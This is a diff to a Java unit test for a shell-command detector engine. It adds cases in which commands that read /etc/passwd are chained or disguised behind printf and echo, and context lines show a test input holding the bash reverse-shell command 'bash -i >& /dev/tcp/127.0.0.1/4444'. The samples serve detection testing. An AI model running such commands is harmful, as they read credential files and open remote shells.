@@ -443,6 +443,18 @@ final class DetectorEngineTest {
   }
 
   @Test
+  void literalOutputDoesNotExemptOtherShellOperations() {
+    for (String program : List.of("printf '%s' weekly\ncat /etc/passwd", "REPORT=/bin/echo cat /etc/passwd",
+        "printf %s weekly; cat /etc/passwd")) {
+      assertAlgorithm(engine.detectCommand(List.of("sh", "-c", program), request()), "command_common");
+    }
+    for (String program : List.of("echo 'guide: cat /etc/passwd'", "printf 'percent %% [%8.3s]' 'cat /etc/passwd'")) {
+      assertTrue(engine.detectCommand(List.of("sh", "-c", program), request()).isEmpty(), program);
+    }
+    assertAlgorithm(engine.detectCommand(List.of("sh", "-c", "/bin/cat -- '/etc/'passwd"), request()), "command_common");
+  }
+
+  @Test
   void detectsCommonDangerousCommand() {
     var result = engine.detectCommand(List.of("bash", "-i", ">&", "/dev/tcp/127.0.0.1/4444"), request());
 
